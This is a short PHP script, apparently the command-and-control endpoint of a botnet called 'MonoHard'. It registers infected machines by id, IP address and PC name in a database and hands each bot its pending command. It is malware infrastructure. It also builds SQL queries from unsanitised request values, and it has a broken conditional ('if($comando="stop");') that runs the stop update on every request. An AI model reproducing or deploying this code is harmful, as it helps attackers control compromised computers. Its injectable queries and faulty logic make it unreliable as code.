<?php
 /******************************************************************************************
           ____    ____                        ____  ____                       __  
          |_   \  /   _|                      |_   ||   _|                     |  ] 
            |   \/   |   .--.   _ .--.   .--.   | |__| |   ,--.   _ .--.   .--.| |  
            | |\  /| | / .'`\ \[ `.-. |/ .'`\ \ |  __  |  `'_\ : [ `/'`\]/ /'`\' |  
           _| |_\/_| |_| \__. | | | | || \__. |_| |  | |_ // | |, | |    | \__/  |  
          |_____||_____|'.__.' [___||__]'.__.'|____||____|\'-;__/[___]    '.__.;__] . .   .-.    . 
                                                                                    | |   |\|   '| 
                 By Carlos Ganoza || www.todoporelvicio.com                         `.'   `-' .  '
 ******************************************************************************************/
$comando=isset($_GET['cmd'])  ?  $_GET['cmd']   :  NULL;
$pc=isset($_POST['pc'])  ?  $_POST['pc']   :  NULL;
$idu=isset($_POST['idu'])  ?  $_POST['idu']   :  NULL;
$time=isset($_POST['time'])  ?  $_POST['time']   :  NULL;
include('conexion.php');

$ip=($_SERVER['REMOTE_ADDR']);
$result = mysql_query("SELECT idu,comando FROM bot WHERE idu='".$idu."'");
if($comando="stop");
{
mysql_query("UPDATE bot SET comando='stop' WHERE idu='".$idu."'");
}
if (mysql_num_rows($result) > 0  ) 
{mysql_query("UPDATE bot SET ip='".$ip."', date='".time()."' WHERE idu='".$idu."'");
 while($row = mysql_fetch_array($result))
{
echo $row['comando'];

}}
else {

mysql_query("INSERT INTO bot VALUES('', '".$idu."', '".$ip."', '".$pc."', '".time()."','stop', '".$time."')");
echo "stop";
}
?>



